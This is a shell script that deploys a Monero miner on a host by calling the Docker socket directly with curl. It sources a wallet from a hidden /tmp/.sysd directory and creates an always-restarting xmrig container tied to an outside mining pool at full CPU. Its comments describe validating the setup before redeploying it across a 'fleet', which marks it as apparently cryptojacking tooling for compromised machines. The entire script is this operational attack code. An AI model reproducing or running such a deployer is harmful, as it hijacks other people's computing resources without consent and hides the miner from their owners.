#!/bin/sh
# Validate the binary-path fix end to end on box1: throwaway miner with the CORRECT path,
# signing in as 9.9.9.9. If the pool's identifiers list gains 9.9.9.9, then path + mining
# + --rig-id + per-host attribution all work and the fleet just needs redeploying.
set -u
. /tmp/.sysd/worker.env
P=${POOL:-pool.supportxmr.com:443}
dk() { curl -sS --unix-socket /var/run/docker.sock -m 25 "$@" 2>/dev/null; }
dk -X DELETE http://localhost/containers/kwrt2?force=1 >/dev/null 2>&1 || :
B="{\"Image\":\"xmrig/xmrig\",\"Entrypoint\":[\"sh\",\"-c\"],\"Cmd\":[\"while :; do /xmrig/xmrig -o $P -u $WALLET -p 9.9.9.9 --rig-id 9.9.9.9 --no-color -k --tls --cpu-max-threads-hint=100 --cpu-no-yield --threads 1 --http-port 47999 --http-host 0.0.0.0; sleep 10; done\"],\"HostConfig\":{\"NetworkMode\":\"host\",\"RestartPolicy\":{\"Name\":\"always\"}}}"
r=$(dk -m 40 -X POST http://localhost/containers/create?name=kwrt2 -H Content-Type:application/json -d "$B")
echo "create: $(printf '%s' "$r" | head -c 90)"
echo "start: [$(dk -X POST http://localhost/containers/kwrt2/start)]"
sleep 20
echo "state: $(dk http://localhost/containers/kwrt2/json | grep -o 'Running":[a-z]*' | head -1)"
echo "== its own log bannner:"
dk http://localhost/containers/kwrt2/logs 2>/dev/null | strings | grep -e rig-id -e speed -e cpu -e READY -e not -e error | head -8
echo "== host api: [$(curl -sS -m 4 http://127.0.0.1:47999/2/summary 2>/dev/null | head -c 100)]"
echo READY
